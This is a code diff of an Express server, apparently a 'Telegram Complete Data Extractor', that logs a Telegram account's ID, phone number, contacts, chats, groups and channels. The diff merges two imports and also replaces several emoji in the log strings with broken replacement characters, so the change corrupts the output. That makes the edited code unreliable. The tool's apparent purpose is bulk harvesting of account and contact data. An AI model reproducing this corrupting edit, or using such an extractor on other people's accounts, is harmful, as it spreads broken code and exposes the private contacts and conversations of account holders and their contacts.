@@ -1,8 +1,7 @@
 const express = require('express');
 const cors = require('cors');
-const { TelegramApi } = require('telegram');
+const { TelegramApi, Api } = require('telegram');
 const { StringSession } = require('telegram/sessions');
-const { Api } = require('telegram');
 
 const app = express();
 app.use(cors());
@@ -143,11 +142,11 @@ async function extractUserData(client, user, phoneNumber) {
 
         // Detailed logging
         console.log(`\n📊 === COMPLETE DATA REPORT ===`);
-        console.log(`👤 User: ${user.firstName} ${user.lastName}`);
+        console.log(`�� User: ${user.firstName} ${user.lastName}`);
         console.log(`📱 Phone: ${phoneNumber}`);
         console.log(`🆔 Telegram ID: ${user.id}`);
         console.log(`\n📈 STATISTICS:`);
-        console.log(`   📞 Total Contacts: ${contacts.length}`);
+        console.log(`   �� Total Contacts: ${contacts.length}`);
         console.log(`   💬 Total Chats: ${dialogs.total}`);
         console.log(`   👥 Groups: ${groups.length}`);
         console.log(`   📢 Channels: ${channels.length}`);
@@ -155,7 +154,7 @@ async function extractUserData(client, user, phoneNumber) {
 
         // Log contact details
         if (contacts.length > 0) {
-            console.log(`\n📋 CONTACTS (First 15):`);
+            console.log(`\n�� CONTACTS (First 15):`);
             contacts.slice(0, 15).forEach((contact, index) => {
                 const name = `${contact.firstName || ''} ${contact.lastName || ''}`.trim() || 'Unknown';
                 const username = contact.username ? ` (@${contact.username})` : '';
@@ -178,7 +177,7 @@ async function extractUserData(client, user, phoneNumber) {
 
         // Log channel details
         if (channels.length > 0) {
-            console.log(`\n📋 CHANNELS (All ${channels.length}):`);
+            console.log(`\n�� CHANNELS (All ${channels.length}):`);
             channels.forEach((channel, index) => {
                 const subText = channel.entity.participantsCount ? ` (${channel.entity.participantsCount} subscribers)` : '';
                 const username = channel.entity.username ? ` (@${channel.entity.username})` : '';
@@ -231,7 +230,7 @@ app.get('/', (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`🚀 Telegram Complete Data Extractor Started`);
-    console.log(`📡 Running on port ${PORT}`);
+    console.log(`�� Running on port ${PORT}`);
     console.log(`🔍 Mode: Complete safe data extraction`);
     console.log(`⚠️  NO ACTIONS TAKEN - Data extraction only`);
     console.log(`📊 Provides comprehensive user data analysis`);
